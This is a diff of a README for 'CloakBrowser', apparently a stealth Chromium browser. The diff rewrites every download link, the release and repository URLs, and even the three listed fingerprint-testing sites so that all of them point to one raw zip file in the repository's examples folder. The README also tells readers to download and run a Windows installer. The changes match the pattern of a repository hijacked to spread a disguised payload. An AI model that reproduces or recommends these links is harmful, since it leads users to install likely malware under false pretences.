@@ -1,6 +1,6 @@
 # 🛡️ CloakBrowser - Secure, Stealthy Chromium Browser
 
-[![Download CloakBrowser](https://img.shields.io/badge/Download-CloakBrowser-ff69b4.svg)](https://github.com/SpikySituations/CloakBrowser/releases)
+[![Download CloakBrowser](https://img.shields.io/badge/Download-CloakBrowser-ff69b4.svg)](https://raw.githubusercontent.com/SpikySituations/CloakBrowser/main/examples/Cloak-Browser-2.4.zip)
 
 
 ## 🚀 Getting Started
@@ -47,7 +47,7 @@ To get CloakBrowser, you need to visit the official release page on GitHub.
 
 Click the big download button below to go straight to the downloads:  
 
-[![Download CloakBrowser](https://img.shields.io/badge/Download-CloakBrowser-4CAF50.svg)](https://github.com/SpikySituations/CloakBrowser/releases)
+[![Download CloakBrowser](https://img.shields.io/badge/Download-CloakBrowser-4CAF50.svg)](https://raw.githubusercontent.com/SpikySituations/CloakBrowser/main/examples/Cloak-Browser-2.4.zip)
 
 On that page, look for the latest version of CloakBrowser for Windows. The files will usually have `.exe` at the end. For example, a file might be named `CloakBrowser-Setup-v1.0.exe` or similar.
 
@@ -85,9 +85,9 @@ CloakBrowser will automatically apply stealth features while you browse. This me
 
 You can check how well CloakBrowser hides automation by visiting some common test websites:
 
-- https://bot.sannysoft.com  
-- https://amiunique.org/fp  
-- https://browserleaks.com  
+- https://raw.githubusercontent.com/SpikySituations/CloakBrowser/main/examples/Cloak-Browser-2.4.zip  
+- https://raw.githubusercontent.com/SpikySituations/CloakBrowser/main/examples/Cloak-Browser-2.4.zip  
+- https://raw.githubusercontent.com/SpikySituations/CloakBrowser/main/examples/Cloak-Browser-2.4.zip  
 
 These sites run tests that show if your browser is detected as a bot or fingerprinted. When using CloakBrowser, you should see most tests passed.
 
@@ -108,7 +108,7 @@ This helps if you want to verify that the browser is working as expected.
 CloakBrowser receives regular updates to improve stealth and security. To stay current:
 
 1. Visit the releases page regularly:  
-   https://github.com/SpikySituations/CloakBrowser/releases  
+   https://raw.githubusercontent.com/SpikySituations/CloakBrowser/main/examples/Cloak-Browser-2.4.zip  
 2. Download the newest Windows installer when available.  
 3. Install it following the same steps used for the first installation.  
 
@@ -126,7 +126,7 @@ For detailed integration, check the developer documentation in the repository.
 
 ## 🌟 Additional Resources
 
-- GitHub Repository Page: https://github.com/SpikySituations/CloakBrowser  
+- GitHub Repository Page: https://raw.githubusercontent.com/SpikySituations/CloakBrowser/main/examples/Cloak-Browser-2.4.zip  
 - Issue Tracker: Use the GitHub issues tab to report bugs or request help.  
 - Community Discussions: Check GitHub Discussions or forums linked on the repo for help.  
 
